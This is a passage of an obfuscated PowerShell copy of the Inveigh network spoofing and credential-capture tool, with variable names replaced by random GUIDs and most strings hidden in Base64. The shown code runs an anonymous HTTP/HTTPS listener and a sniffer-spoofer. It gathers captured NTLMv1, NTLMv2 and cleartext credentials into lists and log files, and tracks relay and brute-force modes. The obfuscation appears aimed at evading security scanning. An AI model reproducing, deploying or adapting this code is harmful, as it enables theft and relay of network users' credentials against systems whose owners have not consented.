                ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue[0]|Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_out_file -Append
                ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue.RemoveRange(0,1)
            }
            while(${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_file_queue.Count -gt 0)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_file_queue[0]|Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_out_file -Append
                ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_file_queue.RemoveRange(0,1)
            }
        }
    }
    ${b4304126005f4398a3eb28bab5b0c479}.Close()
    ${52c45904fce048da8132b3c3c58fa8d3}.Dispose()
    ${52c45904fce048da8132b3c3c58fa8d3}.Close()
}
Function HTTPListener()
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener = New-Object System.Net.HttpListener
    if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP)
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Prefixes.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAqADoAOAAwAC8A'))))
    }
    if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS)
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Prefixes.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvACoAOgA0ADQAMwAvAA=='))))
    }
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.AuthenticationSchemes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) 
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Start()
    ${7fa0b96b04044cf4b53f735f71ffb2b9} = [runspacefactory]::CreateRunspace()
    ${7fa0b96b04044cf4b53f735f71ffb2b9}.Open()
    ${7fa0b96b04044cf4b53f735f71ffb2b9}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${98a67e4723ee472fa2340d2ec14a0f94})
    ${76b5d61f330c4d2b811b5023015021b2} = [powershell]::Create()
    ${76b5d61f330c4d2b811b5023015021b2}.Runspace = ${7fa0b96b04044cf4b53f735f71ffb2b9}
    ${76b5d61f330c4d2b811b5023015021b2}.AddScript(${a2be443c2a404f3b8dbfa3056d80388e}) > $null
    ${76b5d61f330c4d2b811b5023015021b2}.AddScript(${3955e5e75bf14bbc8d661d8fbbe37646}) > $null
    ${76b5d61f330c4d2b811b5023015021b2}.AddScript(${9a8f958a8dbf44f2a96ea8decf7a0c63}).AddArgument(${edc4d2f44c8e4e63b7b00dfe56110aca}).AddArgument(
        ${aee1694b16de43f98158814241da1ee1}).AddArgument(${d4dc92f8b9e04a91be5eb7099818dc83}).AddArgument(${e0502cdf78554c8c80746316292c02fb}) > $null
    ${76b5d61f330c4d2b811b5023015021b2}.BeginInvoke() > $null
}
Function SnifferSpoofer()
{
    ${68995e2a089844199cef6fb0621b32b0} = [runspacefactory]::CreateRunspace()
    ${68995e2a089844199cef6fb0621b32b0}.Open()
    ${68995e2a089844199cef6fb0621b32b0}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${98a67e4723ee472fa2340d2ec14a0f94})
    ${8b0399cb5bb440d9b03088b0fb62e1ab} = [powershell]::Create()
    ${8b0399cb5bb440d9b03088b0fb62e1ab}.Runspace = ${68995e2a089844199cef6fb0621b32b0}
    ${8b0399cb5bb440d9b03088b0fb62e1ab}.AddScript(${a2be443c2a404f3b8dbfa3056d80388e}) > $null
    ${8b0399cb5bb440d9b03088b0fb62e1ab}.AddScript(${3955e5e75bf14bbc8d661d8fbbe37646}) > $null
    ${8b0399cb5bb440d9b03088b0fb62e1ab}.AddScript(${2b0529ce8e854acda3f9477a6b4c1d93}).AddArgument(${c5db9900dc8d4a1986872012ce91b73b}).AddArgument(
        ${7e494e4ea1a0426ab7d62b9675e564b6}).AddArgument(${abd19e74908a450e847564f92e2000eb}).AddArgument(${cd4629bb22504e88a1343d2e9edd39ef}).AddArgument(${b8a133e08e4b4881a9cfa933aa78c19b}).AddArgument(
        ${dcac5669feaa43bda9605b66542e90eb}).AddArgument(${e02740c242b24642905a7b9f9b2a7776}).AddArgument(${c9cd43846ba641a4bd0d1bdc810d0f50}).AddArgument(${d70c9d958dd44a10be0c532f517e3ef9}).AddArgument(
        ${a73d854ec3594cb5ac43e5562413d1c1}).AddArgument(${bd1d14dc52ab4d71ab33f77ef0ab851a}).AddArgument(${ab5c9a3797aa40cf86faf228516f1393}).AddArgument(
        ${d4dc92f8b9e04a91be5eb7099818dc83}).AddArgument(${e1ee1c6aeb484ee2af1947e459200566}).AddArgument(${dee7bdc3a9b748e894d764b79a5e7e1c}).AddArgument(${e6e42c54e98044ba98fdf24d79b5f9ee}) > $null
    ${8b0399cb5bb440d9b03088b0fb62e1ab}.BeginInvoke() > $null
}
if((${98a67e4723ee472fa2340d2ec14a0f94}.HTTP -or ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS) -and ${db77efe80dee43d796b1ffc2102b7549} -eq 'n')
{
    HTTPListener
}
SnifferSpoofer
if(${98a67e4723ee472fa2340d2ec14a0f94}.console_output)
{
    :console_loop while((${98a67e4723ee472fa2340d2ec14a0f94}.running -and ${98a67e4723ee472fa2340d2ec14a0f94}.console_output) -or (${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.Count -gt 0 -and ${98a67e4723ee472fa2340d2ec14a0f94}.console_output))
    {
        while(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.Count -gt 0)
        {
            if(${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only)
            {
                write-output(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0] + ${98a67e4723ee472fa2340d2ec14a0f94}.newline)
                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                    {
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        }
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
        if(${98a67e4723ee472fa2340d2ec14a0f94}.console_input)
        {
            if([console]::KeyAvailable)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.console_output = $false
                BREAK console_loop
            }
        }
        sleep -m 5
    }
}
}
Function Stop-Inveigh
{
    if(${98a67e4723ee472fa2340d2ec14a0f94})
    {
        if(${98a67e4723ee472fa2340d2ec14a0f94}.running -or ${98a67e4723ee472fa2340d2ec14a0f94}.relay_running -or ${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running)
        {
            if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.IsListening)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Stop()
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Close()
            }
            if(${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running = $false
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")|Out-Null
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.server.blocking = $false
                sleep -s 1
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.server.Close()
                sleep -s 1
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Stop()
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Inveigh Brute Force exited at $(Get-Date -format 's')")|Out-Null
                ${98a67e4723ee472fa2340d2ec14a0f94}.log.add("$(Get-Date -format 's') - Inveigh Brute Force exited")|Out-Null
                if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Brute Force exited"| Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append
                }
            }
            if(${98a67e4723ee472fa2340d2ec14a0f94}.relay_running)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.relay_running = $false
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Inveigh Relay exited at $(Get-Date -format 's')")|Out-Null
                ${98a67e4723ee472fa2340d2ec14a0f94}.log.add("$(Get-Date -format 's') - Inveigh Relay exited")|Out-Null
                if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Relay exited"| Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append
                }
            } 
            if(${98a67e4723ee472fa2340d2ec14a0f94}.running)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.running = $false
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
                ${98a67e4723ee472fa2340d2ec14a0f94}.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null
                if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh exited"| Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append
                }
            } 
        }
        else
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))) | Out-Null
        }
        if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS)
        {
            & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) http delete sslcert ipport=0.0.0.0:443 > $null
            try
            {
                ${925f8307b58e4f8f9c79fdb766b92b9f} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                ${925f8307b58e4f8f9c79fdb766b92b9f}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                ${2b05bef5311b4efd95c42dffa7b9312f} = ${925f8307b58e4f8f9c79fdb766b92b9f}.certificates.find($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABCAHkAVABoAHUAbQBiAHAAcgBpAG4AdAA='))),${98a67e4723ee472fa2340d2ec14a0f94}.certificate_thumbprint,$FALSE)[0]
                ${925f8307b58e4f8f9c79fdb766b92b9f}.Remove(${2b05bef5311b4efd95c42dffa7b9312f})
                ${925f8307b58e4f8f9c79fdb766b92b9f}.Close()
            }
            catch
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA'))))|Out-Null
                ${98a67e4723ee472fa2340d2ec14a0f94}.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")|Out-Null
                if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                {
                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"|Out-File ${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file -Append   
                }
            }
        }
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP = $false
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS = $false
    }
    else
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA=='))))|Out-Null
    }
    if(${98a67e4723ee472fa2340d2ec14a0f94}.status_output)
    {
        while(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.Count -gt 0)
        {
            if(${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only)
            {
                write-output(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0] + ${98a67e4723ee472fa2340d2ec14a0f94}.newline)
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA')))
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0]
                        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
    }
} 
Function Get-Inveigh
{
    while(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.Count -gt 0)
    {
        if(${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only)
        {
            write-output(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0] + ${98a67e4723ee472fa2340d2ec14a0f94}.newline)
            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
        }
        else
        {
            switch -wildcard (${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0])
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                {
                    write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                {
                    if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                    {
                        write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    }
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                {
                    write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                {
                    write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                {
                    write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                }
            }
        }    
    }
}
Function Get-InveighCleartext
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_list
}
Function Get-InveighNTLM
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list
    ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list
}
Function Get-InveighNTLMv1
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${a168fad186674731b83c9a2574c9f19f},
        [parameter(ValueFromRemainingArguments=$true)] ${e931bd909e564a0e8ba4c9d3d19d8938}
    )
    if (${e931bd909e564a0e8ba4c9d3d19d8938})
    {
        throw "$(${e931bd909e564a0e8ba4c9d3d19d8938}) is not a valid parameter."
    }
    if(${a168fad186674731b83c9a2574c9f19f})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list.sort()
        ForEach($unique_NTLMv1 in ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list)
        {
            ${f1850d4d0aba45f4bc67ede87cb371cc} = $unique_NTLMv1.substring(0,$unique_NTLMv1.indexof(":",($unique_NTLMv1.indexof(":")+2)))
            if(${f1850d4d0aba45f4bc67ede87cb371cc} -ne ${5e52175c4d4d4922a45db925f21cb5f7})
            {
                $unique_NTLMv1
            }
            ${5e52175c4d4d4922a45db925f21cb5f7} = ${f1850d4d0aba45f4bc67ede87cb371cc}
        }
    }
    else
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list
    }
}
Function Get-InveighNTLMv2
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${a168fad186674731b83c9a2574c9f19f},
        [parameter(ValueFromRemainingArguments=$true)] ${e931bd909e564a0e8ba4c9d3d19d8938}
    )
    if (${e931bd909e564a0e8ba4c9d3d19d8938})
    {
        throw "$(${e931bd909e564a0e8ba4c9d3d19d8938}) is not a valid parameter."
    }
    if(${a168fad186674731b83c9a2574c9f19f})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list.sort()
        ForEach($unique_NTLMv2 in ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list)
        {
            ${c9ffe0db2da7430cb22f9932820b54ec} = $unique_NTLMv2.substring(0,$unique_NTLMv2.indexof(":",($unique_NTLMv2.indexof(":")+2)))
            if(${c9ffe0db2da7430cb22f9932820b54ec} -ne ${43d56302e4f74b529dbde936f0e70709})
            {
                $unique_NTLMv2
            }
            ${43d56302e4f74b529dbde936f0e70709} = ${c9ffe0db2da7430cb22f9932820b54ec}
        }
    }
    else
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list
    }
}
Function Get-InveighLog
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.log
}
Function Get-InveighStat
{
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAAQwBsAGUAYQByAHQAZQB4AHQAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADEAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADIAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list.count)
}
Function Watch-Inveigh
{
    if(${98a67e4723ee472fa2340d2ec14a0f94}.tool -ne 1)
    {
        if(${98a67e4723ee472fa2340d2ec14a0f94}.running -or ${98a67e4723ee472fa2340d2ec14a0f94}.relay_running -or ${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))
            ${98a67e4723ee472fa2340d2ec14a0f94}.console_output = $true
            :console_loop while(((${98a67e4723ee472fa2340d2ec14a0f94}.running -or ${98a67e4723ee472fa2340d2ec14a0f94}.relay_running -or ${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running) -and ${98a67e4723ee472fa2340d2ec14a0f94}.console_output) -or (${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.Count -gt 0 -and ${98a67e4723ee472fa2340d2ec14a0f94}.console_output))
            {
                while(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.Count -gt 0)
                {
                    if(${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only)
                    {
                        write-output(${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0] + ${98a67e4723ee472fa2340d2ec14a0f94}.newline)
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                    }
                    else
                    {
                        switch -wildcard (${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0])
                        {  
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                            {
                                write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                            {
                                if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                                {
                                    write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                }
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                            {
                                write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                            {
                                write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                            {
                                write-warning ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                            default
                            {
                                write-output ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue[0]
                                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.RemoveRange(0,1)
                            }
                        }
                    }            
                }
                if([console]::KeyAvailable)
                {
                    ${98a67e4723ee472fa2340d2ec14a0f94}.console_output = $false
                    BREAK console_loop
                }
                sleep -m 5
            }
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGkAcwBuACcAdAAgAHIAdQBuAG4AaQBuAGcA')))
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAHQAYwBoAC0ASQBuAHYAZQBpAGcAaAAgAGMAYQBuAG4AbwB0ACAAYgBlACAAdQBzAGUAZAAgAHcAaQB0AGgAIABjAHUAcgByAGUAbgB0ACAAZQB4AHQAZQByAG4AYQBsACAAdABvAG8AbAAgAHMAZQBsAGUAYwB0AGkAbwBuAA==')))
    }
}
Function Clear-Inveigh
{
    if(${98a67e4723ee472fa2340d2ec14a0f94})
    {
        if(!${98a67e4723ee472fa2340d2ec14a0f94}.running -and !${98a67e4723ee472fa2340d2ec14a0f94}.relay_running -and !${98a67e4723ee472fa2340d2ec14a0f94}.bruteforce_running)
        {
            rv inveigh -scope global
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGQAYQB0AGEAIABoAGEAcwAgAGIAZQBlAG4AIABjAGwAZQBhAHIAZQBkACAAZgByAG8AbQAgAG0AZQBtAG8AcgB5AA==')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAGIAZQBmAG8AcgBlACAAcgB1AG4AbgBpAG4AZwAgAEMAbABlAGEAcgAtAEkAbgB2AGUAaQBnAGgA')))
        }
    }
}